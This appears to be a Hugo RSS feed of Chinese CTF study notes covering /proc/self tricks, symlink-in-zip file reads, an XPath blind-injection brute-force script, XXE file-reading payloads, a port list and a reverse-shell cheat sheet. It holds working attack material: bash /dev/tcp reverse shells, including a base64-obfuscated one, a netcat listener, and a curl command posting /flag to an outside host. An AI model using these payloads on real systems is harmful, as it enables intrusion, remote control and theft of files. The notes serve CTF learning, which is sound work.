@@ -1,0 +1,285 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>other on Alex lan</title><link>http://localhost:1313/docs/network-security/other/</link><description>Recent content in other on Alex lan</description><generator>Hugo</generator><language>en</language><lastBuildDate>Sun, 08 Dec 2024 14:03:24 +0800</lastBuildDate><atom:link href="http://localhost:1313/docs/network-security/other/index.xml" rel="self" type="application/rss+xml"/><item><title>linux 知识点</title><link>http://localhost:1313/docs/network-security/other/linux/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/other/linux/</guid><description>&lt;h2 id="软连接">
+ 软连接
+ &lt;a class="anchor" href="#%e8%bd%af%e8%bf%9e%e6%8e%a5">#&lt;/a>
+&lt;/h2>
+&lt;ol>
+&lt;li>在 linux 中，/proc/self/cwd/会指向进程的当前目录，在不知道 flask 工作目录时，我们可以用/proc/self/cwd/flag/flag.jpg来访问 flag.jpg。&lt;/li>
+&lt;li>ln -s是Linux的软连接命令,其类似与windows的快捷方式。比如ln -s /etc/passwd shawroot 这会出现一个名为shawroot的文件,其内容为/etc/passwd的内容。&lt;/li>
+&lt;/ol>
+&lt;pre tabindex="0">&lt;code>ln -s /proc/self/cwd/flag/flag.jpg shaw
+zip -ry root.zip shaw
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>-r：将指定的目录下的所有子目录以及文件一起处理
+
+-y：直接保存符号连接，而非该连接所指向的文件，本参数仅在UNIX之类的系统下有效。
+&lt;/code>&lt;/pre>&lt;h2 id="procself">
+ /proc/self
+ &lt;a class="anchor" href="#procself">#&lt;/a>
+&lt;/h2>
+&lt;p>proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。&lt;/p>
+&lt;p>还有的是一些以数字命名的目录，他们是进程目录，系统中当前运行的每一个进程都有对应的一个目录在/proc下，以进程的PID号为目录名，他们是读取进程信息的接口&lt;/p>
+&lt;ul>
+&lt;li>cmdline&lt;/li>
+&lt;/ul>
+&lt;p>cmdline 文件存储着启动当前进程的完整命令&lt;/p>
+&lt;pre tabindex="0">&lt;code>cat /proc/1083/cmdline
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>cwd&lt;/li>
+&lt;/ul>
+&lt;p>cwd 文件是一个指向当前进程运行目录的符号链接。可以通过查看cwd文件获取目标指定进程环境的运行目录&lt;/p>
+&lt;pre tabindex="0">&lt;code>ls -al /proc/1083/cwd
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>exe 是一个指向启动当前进程的可执行文件（完整路径）的符号链接。通过exe文件我们可以获得指定进程的可执行文件的完整路径&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>ls -al /proc/1090/exe
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>
+&lt;p>environ&lt;/p>
+&lt;p>environ文件存储着当前进程的环境变量列表，通过查看environ目录来获取指定进程的环境变量信息&lt;/p>
+&lt;pre tabindex="0">&lt;code>cat /proc/2889/environ
+&lt;/code>&lt;/pre>&lt;/li>
+&lt;li>
+&lt;p>fd&lt;/p>
+&lt;p>里面包含着当前进程打开的每一个文件的描述符(路径)&lt;/p>
+&lt;pre tabindex="0">&lt;code>ls -al /proc/1083/fd /proc/self表示当前进程目录
+&lt;/code>&lt;/pre>&lt;/li>
+&lt;li>
+&lt;p>/proc/self表示当前进程目录，在过滤了很多字符时就用，比如目录穿越，任意文件等&lt;/p>
+&lt;pre tabindex="0">&lt;code>/proc/self
+&lt;/code>&lt;/pre>&lt;/li>
+&lt;/ul></description></item><item><title>xpath 注入</title><link>http://localhost:1313/docs/network-security/other/xpath%E6%B3%A8%E5%85%A5/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/other/xpath%E6%B3%A8%E5%85%A5/</guid><description>&lt;p>详见&lt;/p>
+&lt;p>&lt;a href="https://xz.aliyun.com/t/7791#toc-6">XPATH注入学习 - 先知社区 (aliyun.com)&lt;/a>&lt;/p>
+&lt;pre tabindex="0">&lt;code>import requests
+import re
+import time
+
+s = requests.session()
+url =&amp;#39;http://400f158d-53cf-4163-82a9-0d5ca129fab9.node4.buuoj.cn:81/login.php&amp;#39;
+
+
+
+head ={
+ &amp;#34;User-Agent&amp;#34;: &amp;#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36&amp;#34;,
+ &amp;#34;Content-Type&amp;#34;: &amp;#34;application/xml&amp;#34;
+}
+find =re.compile(&amp;#39;&amp;lt;input type=&amp;#34;hidden&amp;#34; id=&amp;#34;token&amp;#34; value=&amp;#34;(.*?)&amp;#34; /&amp;gt;&amp;#39;)
+
+strs =&amp;#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&amp;#39;
+
+
+flag =&amp;#39;&amp;#39;
+for i in range(1,100):
+ for j in strs:
+ time.sleep(0.2)
+ r = s.post(url=url)
+ token = find.findall(r.text)
+ #猜测根节点名称
+ payload_1 = &amp;#34;&amp;lt;username&amp;gt;&amp;#39;or substring(name(/*[1]), {}, 1)=&amp;#39;{}&amp;#39; or &amp;#39;&amp;#39;=&amp;#39;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;3123&amp;lt;/password&amp;gt;&amp;lt;token&amp;gt;{}&amp;lt;/token&amp;gt;&amp;#34;.format(i,j,token[0])
+ #猜测子节点名称
+ payload_2 = &amp;#34;&amp;lt;username&amp;gt;&amp;#39;or substring(name(/root/*[1]), {}, 1)=&amp;#39;{}&amp;#39; or &amp;#39;&amp;#39;=&amp;#39;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;3123&amp;lt;/password&amp;gt;&amp;lt;token&amp;gt;{}&amp;lt;/token&amp;gt;&amp;#34;.format(i,j,token[0])
+
+ #猜测accounts的节点
+ payload_3 =&amp;#34;&amp;lt;username&amp;gt;&amp;#39;or substring(name(/root/accounts/*[1]), {}, 1)=&amp;#39;{}&amp;#39; or &amp;#39;&amp;#39;=&amp;#39;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;3123&amp;lt;/password&amp;gt;&amp;lt;token&amp;gt;{}&amp;lt;/token&amp;gt;&amp;#34;.format(i,j,token[0])
+
+ #猜测user节点
+ payload_4 =&amp;#34;&amp;lt;username&amp;gt;&amp;#39;or substring(name(/root/accounts/user/*[2]), {}, 1)=&amp;#39;{}&amp;#39; or &amp;#39;&amp;#39;=&amp;#39;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;3123&amp;lt;/password&amp;gt;&amp;lt;token&amp;gt;{}&amp;lt;/token&amp;gt;&amp;#34;.format(i,j,token[0])
+
+ #跑用户名和密码
+ payload_username =&amp;#34;&amp;lt;username&amp;gt;&amp;#39;or substring(/root/accounts/user[2]/username/text(), {}, 1)=&amp;#39;{}&amp;#39; or &amp;#39;&amp;#39;=&amp;#39;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;3123&amp;lt;/password&amp;gt;&amp;lt;token&amp;gt;{}&amp;lt;/token&amp;gt;&amp;#34;.format(i,j,token[0])
+
+ payload_password =&amp;#34;&amp;lt;username&amp;gt;&amp;#39;or substring(/root/accounts/user[2]/password/text(), {}, 1)=&amp;#39;{}&amp;#39; or &amp;#39;&amp;#39;=&amp;#39;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;3123&amp;lt;/password&amp;gt;&amp;lt;token&amp;gt;{}&amp;lt;/token&amp;gt;&amp;#34;.format(i,j,token[0])
+
+
+ print(payload_username)
+ r = s.post(url=url,headers=head,data=payload_password)
+ print(r.text)
+
+
+ if &amp;#34;非法操作&amp;#34; in r.text:
+ flag+=j
+ print(flag)
+ break
+
+ if &amp;#34;用户名或密码错误!&amp;#34; in r.text:
+ break
+
+print(flag)
+&lt;/code>&lt;/pre></description></item><item><title>XXE</title><link>http://localhost:1313/docs/network-security/other/xxe/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/other/xxe/</guid><description>&lt;p>XXE(XML External Entity attack)XML外部实体注入攻击&lt;/p>
+&lt;pre tabindex="0">&lt;code>&amp;lt;?xml version=&amp;#39;1.0&amp;#39;?&amp;gt; 
+&amp;lt;!DOCTYPE x [
+ &amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///flag&amp;#34;&amp;gt;
+]&amp;gt;
+ &amp;lt;root&amp;gt;
+ &amp;lt;username&amp;gt;
+ admin//或者&amp;amp;xxe;
+ &amp;lt;/username&amp;gt;
+ &amp;lt;password&amp;gt;123&amp;lt;/password&amp;gt;
+ &amp;lt;/root&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>&lt;code>&amp;amp;xxe;&lt;/code>会输出文件中的内容&lt;/p>
+&lt;p>在上传xml文件时，utf8不行可以用utf16&lt;/p>
+&lt;pre tabindex="0">&lt;code>iconv -f utf8 -t utf-16 1.xml&amp;gt;2.xml
+&lt;/code>&lt;/pre>&lt;p>svg中的xxe&lt;/p>
+&lt;pre tabindex="0">&lt;code>&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
+&amp;lt;!DOCTYPE note [
+&amp;lt;!ENTITY file SYSTEM &amp;#34;file:///proc/self/cwd/flag.txt&amp;#34; &amp;gt;
+]&amp;gt;
+&amp;lt;svg height=&amp;#34;100&amp;#34; width=&amp;#34;1000&amp;#34;&amp;gt;
+ &amp;lt;text x=&amp;#34;10&amp;#34; y=&amp;#34;20&amp;#34;&amp;gt;&amp;amp;file;&amp;lt;/text&amp;gt;
+&amp;lt;/svg&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>svg中也可以写js，xss&lt;/p></description></item><item><title>反弹shell</title><link>http://localhost:1313/docs/network-security/other/%E5%8F%8D%E5%BC%B9shll/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/other/%E5%8F%8D%E5%BC%B9shll/</guid><description>&lt;h2 id="正向链接">
+ 正向链接
+ &lt;a class="anchor" href="#%e6%ad%a3%e5%90%91%e9%93%be%e6%8e%a5">#&lt;/a>
+&lt;/h2>
+&lt;p>攻击者连接目标机器，如远程桌面，web服务，ssh等&lt;/p>
+&lt;h2 id="反向连接">
+ 反向连接
+ &lt;a class="anchor" href="#%e5%8f%8d%e5%90%91%e8%bf%9e%e6%8e%a5">#&lt;/a>
+&lt;/h2>
+&lt;p>相当于角色反转，让目标机器来找我们，为什么要这样做呢&lt;/p>
+&lt;p>常见于命令不回显，受限于防火墙等&lt;/p>
+&lt;p>反弹shell,让目标机器来找我们，就得要有一个公网ip&lt;/p>
+&lt;p>我们用ngrok.cc送的，可以免费用一个公网端口&lt;/p>
+&lt;pre tabindex="0">&lt;code>./sunny clientid 204616381952
+
+
+free.idcfengye.com:10189
+&lt;/code>&lt;/pre>&lt;p>本地映射1234d端口，监听&lt;/p>
+&lt;pre tabindex="0">&lt;code>nc -lvp 1234
+&lt;/code>&lt;/pre>&lt;h2 id="常见的方式">
+ 常见的方式
+ &lt;a class="anchor" href="#%e5%b8%b8%e8%a7%81%e7%9a%84%e6%96%b9%e5%bc%8f">#&lt;/a>
+&lt;/h2>
+&lt;ul>
+&lt;li>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1
+
+or
+
+bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1&amp;#34;#更稳定
+
+or
+
+echo &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.0.112/1234 0&amp;gt;&amp;amp;1&amp;#34; | bash
+
+or
+
+bash -i &amp;gt;&amp;amp; /dev/tcp/111.111.111.111/7015 0&amp;gt;&amp;amp;1
+#对上面进行base64编码=&amp;gt;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMTExLjExMS4xMTEvNzAxNSAwPiYx
+bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMTExLjExMS4xMTEvNzAxNSAwPiYx}|{base64,-d}|{bash,-i}
+&lt;/code>&lt;/pre>&lt;p>解释&lt;/p>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>命令&lt;/th>
+ &lt;th>详解&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>bash -i&lt;/td>
+ &lt;td>产生一个bash交互环境&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&amp;gt;&amp;amp;&lt;/td>
+ &lt;td>将联合符号前面的内容与后面相结合，然后一起重定向给后者。这样在被攻击机上就不会显示执行的命令&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>/dev/tcp/47.xxx.xxx.72/2333&lt;/td>
+ &lt;td>Linux环境中所有的内容都是以文件的形式存在的，就是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>0&amp;gt;&amp;amp;1&lt;/td>
+ &lt;td>将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;ul>
+&lt;li>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>curl http://vps:7015 -d @/flag
+&lt;/code>&lt;/pre>&lt;p>-d参数时post&lt;/p>
+&lt;p>@后面时这个文件&lt;/p></description></item><item><title>常见端口</title><link>http://localhost:1313/docs/network-security/other/%E7%AB%AF%E5%8F%A3/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/other/%E7%AB%AF%E5%8F%A3/</guid><description>&lt;p>常见端口&lt;/p>
+&lt;pre tabindex="0">&lt;code>21
+22
+23
+3389
+5900
+5632
+69
+139
+389
+2094
+53
+6768
+80
+443
+25
+110
+143
+161
+1433
+1521
+3306
+5000
+5432
+6379
+9200
+270117
+22122
+81
+8080
+9080
+9081
+9090
+3700
+4848
+83
+84
+85
+86
+87
+88
+161
+389
+445
+512
+513
+514
+873
+1025
+1433
+1521
+2082
+2083
+2222
+2601
+2604
+3128
+3306
+3312
+3311
+3389
+4440
+4848
+5984
+6082
+6379
+7001
+7002
+7778
+8083
+8649
+8888
+9000
+9200
+9300
+10000
+11211
+27017
+27018
+28017
+50000
+50070
+50060
+50030
+&lt;/code>&lt;/pre></description></item></channel></rss>
